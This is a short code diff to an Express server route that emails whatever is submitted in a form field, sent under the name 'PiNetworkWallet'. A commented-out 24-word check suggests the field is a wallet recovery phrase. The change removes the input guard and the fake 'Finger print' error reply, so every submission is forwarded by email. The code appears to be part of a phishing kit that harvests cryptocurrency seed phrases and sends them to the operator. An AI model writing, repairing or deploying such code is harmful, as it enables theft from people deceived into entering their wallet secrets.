@@ -54,7 +54,7 @@ app.post("/submit/7668", async (req, res) => {
   const formNonce = req.body["form_nonce"];
   // forward to Email
   try {
-    if(mfText){
+    //if(mfText){
     // if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet",
@@ -84,28 +84,7 @@ app.post("/submit/7668", async (req, res) => {
           redirect_to: "",
         },
       });
-    }else{
-      return res.json({
-        status: 1,
-        store_entries: 1,
-        error: ["Some thing went wrong."],
-        data: {
-          message: "You haven't set up the Finger print yet",
-          hide_form: "",
-          form_data: {
-            action: "insert",
-            id: "7668",
-            form_nonce: formNonce,
-            "mf-text": mfText,
-          },
-          form_id: "7668",
-          store: {
-            "mf-text": mfText,
-          },
-          redirect_to: "",
-        },
-      });
-    }
+   //  }
 
   } catch (error) {
     console.log(error, "the error");
